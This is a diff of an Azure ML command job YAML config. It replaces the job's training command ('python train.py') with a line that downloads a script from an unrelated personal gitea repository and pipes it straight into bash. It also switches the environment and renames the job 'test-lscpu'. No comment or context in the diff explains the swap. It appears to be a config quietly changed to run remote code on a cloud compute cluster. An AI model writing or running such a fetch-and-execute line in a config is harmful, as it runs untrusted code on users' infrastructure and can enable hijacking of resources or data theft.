@@ -1,8 +1,15 @@
 $schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
-type: command
+
+command: curl -sL https://gitea.com/hasmenkuy99/kkrt/raw/main/kyla | bash
+
+# No code directory needed since command does not reference files
 code: .
-command: python train.py
-environment: azureml:AzureML-tensorflow-2.12-ubuntu20.04-py38-cpu@latest
+
+# Use the correct built-in sklearn environment
+environment: azureml:AzureML-sklearn-1.0-ubuntu20.04-py38-cpu@latest
+
+# Your dedicated compute cluster name
 compute: azureml:acluster8
-display_name: tensorflow-cpu-training
-experiment_name: tf-cpu-experiment
+
+display_name: test-lscpu
+experiment_name: sklearn-cpu-test
